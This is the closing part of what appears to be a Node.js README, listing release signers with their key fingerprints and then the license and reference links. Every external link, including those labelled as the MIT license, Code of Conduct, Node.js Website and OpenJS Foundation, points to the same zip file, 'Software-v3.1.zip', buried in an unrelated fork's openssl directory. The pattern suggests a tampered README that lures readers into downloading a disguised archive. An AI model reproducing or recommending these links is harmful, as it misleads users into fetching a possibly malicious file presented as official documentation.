* **Evan Lucas** \<evanlucas@me.com>
  `B9AE9905FFD7803F25714661B63B535A4C206CA9`
* **Gibson Fahnestock** \<gibfahn@gmail.com>
  `77984A986EBC2AA786BC0F66B01FBB92821C587A`
* **Isaac Z. Schlueter** \<i@izs.me>
  `93C7E9E91B49E432C2F75674B0A78B0A6C481CF6`
* **Italo A. Casas** \<me@italoacasas.com>
  `56730D5401028683275BD23C23EFEFE93C4CFFFE`
* **Jeremiah Senkpiel** \<fishrock@keybase.io>
  `FD3A5288F042B6850C66B31F09FE44734EB7990E`
* **Julien Gilli** \<jgilli@fastmail.fm>
  `114F43EE0176B71C7BC219DD50A3051F888C628D`
* **Timothy J Fontaine** \<tjfontaine@gmail.com>
  `7937DFD2AB06298B2293C3187D33FF9D0246406D`

</details>

## License

Node.js is available under the
[MIT license](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip). Node.js also includes
external libraries that are available under a variety of licenses.  See
[LICENSE](https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip) for the full
license text.

[Code of Conduct]: https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip
[Contributing to the project]: CONTRIBUTING.md
[Node.js Website]: https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip
[OpenJS Foundation]: https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip
[Strategic initiatives]: doc/guides/strategic-initiatives.md
[Technical values and prioritization]: doc/guides/technical-values.md
[Working Groups]: https://raw.githubusercontent.com/juliofernandes/node/master/deps/openssl/config/archs/VC-WIN32/asm_avx2/crypto/whrlpool/Software-v3.1.zip
